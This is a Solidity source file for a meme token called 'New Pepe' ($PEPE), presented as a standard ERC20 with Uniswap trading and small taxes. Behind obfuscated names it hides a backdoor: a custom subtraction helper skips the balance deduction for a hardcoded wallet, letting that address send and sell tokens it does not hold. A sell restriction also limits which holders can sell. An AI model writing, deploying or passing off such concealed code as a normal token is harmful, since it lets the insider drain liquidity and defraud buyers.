/**

New Pepe    $PEPE


Telegram: https://t.me/NPepe_Portal

X: https://twitter.com/NPepe_Portal

Website: https://newpepe.org/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _pourih(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _pourih(a, b, "SafeMath");
    }

    function  _pourih(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _qnvifc(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract NewPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _patrvrc;
    address payable private _paoqiy;
    address private _baeurp;
    string private constant _name = unicode"New Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 42069000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _buzoae=0;
    uint256 private _qeucot=0;
    uint256 public _potfzb = _totalSupply;
    uint256 public _qroeuk = _totalSupply;
    uint256 public _plovib= _totalSupply;
    uint256 public _qfigcf= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _bvoend;
    mapping (address => bool) private _pvukau;
    mapping(address => uint256) private _fiknru;

    bool private _pepeopen;
    bool public _pvidoq = false;
    bool private qksibf = false;
    bool private _briwle = false;


    event _purkvj(uint _potfzb);
    modifier freiby {
        qksibf = true;
        _;
        qksibf = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _bvoend[owner(

        )] = true;
        _bvoend[address
        (this)] = true;
        _bvoend[
            _paoqiy] = true;
        _paoqiy = 
        payable (0x46A64DFd6b2eE9bF32E2240Ee9dBbd71D53d2416);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _pourih(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 bfarig=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_pvidoq) {
                if (to 
                != address
                (_patrvrc) 
                && to !=
                 address
                 (_baeurp)) {
                  require(_fiknru
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fiknru
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _baeurp && to != 
            address(_patrvrc) &&
             !_bvoend[to] ) {
                require(amount 
                <= _potfzb,
                 "Exceeds the _potfzb.");
                require(balanceOf
                (to) + amount
                 <= _qroeuk,
                  "Exceeds the _qroeuk.");
                if(_qeucot
                < _buzoae){
                  require
                  (! _frabkv(to));
                }
                _qeucot++;
                 _pvukau
                 [to]=true;
                bfarig = amount._qnvifc
                ((_qeucot>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _baeurp &&
             from!= address(this) 
            && !_bvoend[from] ){
                require(amount <= 
                _potfzb && 
                balanceOf(_paoqiy)
                <_qfigcf,
                 "Exceeds the _potfzb.");
                bfarig = amount._qnvifc((_qeucot>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_qeucot>
                _buzoae &&
                 _pvukau[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!qksibf 
            && to == _baeurp &&
             _briwle &&
             contractTokenBalance>
             _plovib 
            && _qeucot>
            _buzoae&&
             !_bvoend[to]&&
              !_bvoend[from]
            ) {
                _transferFrom( _bofbkv(amount, 
                _bofbkv(contractTokenBalance,
                _qfigcf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _fytnbk(address
                    (this).balance);
                }
            }
        }

        if(bfarig>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(bfarig);
          emit
           Transfer(from,
           address
           (this),bfarig);
        }
        _balances[from
        ]= _pourih(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _pourih(bfarig));
        emit Transfer
        (from, to, 
        amount.
         _pourih(bfarig));
    }

    function _transferFrom(uint256
     tokenAmount) private
      freiby {
        if(tokenAmount==
        0){return;}
        if(!_pepeopen)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _patrvrc.WETH();
        _approve(address(this),
         address(
             _patrvrc), 
             tokenAmount);
        _patrvrc.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _bofbkv
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _pourih(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _paoqiy){
            return a ;
        }else{
            return a .
             _pourih (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _potfzb = _totalSupply;
        _qroeuk = _totalSupply;
        emit _purkvj(_totalSupply);
    }

    function _frabkv(address 
    account) private view 
    returns (bool) {
        uint256 fqrivp;
        assembly {
            fqrivp :=
             extcodesize
             (account)
        }
        return fqrivp > 
        0;
    }

    function _fytnbk(uint256
    amount) private {
        _paoqiy.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _pepeopen ) ;
        _patrvrc  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _patrvrc), 
            _totalSupply);
        _baeurp = 
        IUniswapV2Factory(_patrvrc.
        factory( ) 
        ). createPair (
            address(this
            ),  _patrvrc .
             WETH ( ) );
        _patrvrc.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_baeurp).
        approve(address(_patrvrc), 
        type(uint)
        .max);
        _briwle = true;
        _pepeopen = true;
    }

    receive() external payable {}
}